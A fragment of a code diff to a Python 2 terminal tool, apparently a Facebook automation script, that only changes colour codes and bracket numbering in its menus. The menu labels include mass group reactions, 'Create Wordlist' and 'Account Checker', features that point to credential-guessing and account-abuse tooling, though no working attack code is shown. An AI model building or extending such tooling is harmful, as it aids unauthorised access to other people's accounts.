+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[6] \033[1;92mAngry")
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m Back"
 	print "║"
 	react_pilih()
 #//////////////
 def react_pilih():
 	global tipe
-	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	aksi = raw_input("\033[1;94m╚═\033[1;92mD \033[1;97m")
 	if aksi =="":
 		print "\033[1;91m[!] Wrong input"
 		react_pilih()
@@ -1985,19 +1985,19 @@ def grup_react():
 		login()
 	os.system('reset')
 	print logo
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m1. \033[1;97mLike")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m2. \033[1;97mLove")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m3. \033[1;97mWow")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m4. \033[1;97mHaha")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m5. \033[1;97mSadBoy")
-	print ("\033[1;97m║--\033[1;91m> \033[1;92m6. \033[1;97mAngry")
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[1] \033[1;97mLike")
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[2] \033[1;97mLove")
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[3] \033[1;97mWow")
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[4] \033[1;97mHaha")
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[5] \033[1;97mSadBoy")
+	print ("\033[1;94m║--\033[1;92m> \033[1;91m[6] \033[1;97mAngry")
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;97m Back"
 	print "║"
 	reactg_pilih()
 #//////////////
 def reactg_pilih():
 	global tipe
-	aksi = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	aksi = raw_input("\033[1;94m╚═\033[1;92mD \033[1;97m")
 	if aksi =="":
 		print "\033[1;91m[!] Wrong input"
 		reactg_pilih()
@@ -2264,17 +2264,17 @@ def lain():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Create Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Create Wordlist"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Account Checker"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m See my group list"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Profile Guard"
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "\033[1;94m║--\033[1;92m> \033[1;92m[1]\033[1;92m Create Post"
+	print "\033[1;94m║--\033[1;92m> \033[1;92m[2]\033[1;92m Create Wordlist"
+	print "\033[1;94m║--\033[1;92m> \033[1;92m[3]\033[1;92m Account Checker"
+	print "\033[1;94m║--\033[1;92m> \033[1;92m[4]\033[1;92m See my group list"
+	print "\033[1;94m║--\033[1;92m> \033[1;92m[5]\033[1;92m Profile Guard"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m Back"
 	print "║"
 	pilih_lain()
 #////////////
 def pilih_lain():
-	other = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
+	other = raw_input("\033[1;94m╚═\033[1;92mD \033[1;97m")
 	if other =="":
 		print "\033[1;91m[!] Wrong input"
 		pilih_lain()
@@ -2489,9 +2489,9 @@ def guard():
 		login()
 	os.system('reset')
 	print logo
-	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Activate"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Not activate"
-	print "\033[1;97m║--\033[1;91m> \033[1;91m0.\033[1;97m Back"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[1]\033[1;92m Activate"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[2]\033[1;92m Not activate"
+	print "\033[1;94m║--\033[1;92m> \033[1;91m[0]\033[1;92m Back"
 	print "║"
 	g = raw_input("\033[1;97m╚═\033[1;91mD \033[1;97m")
 	if g == "1":
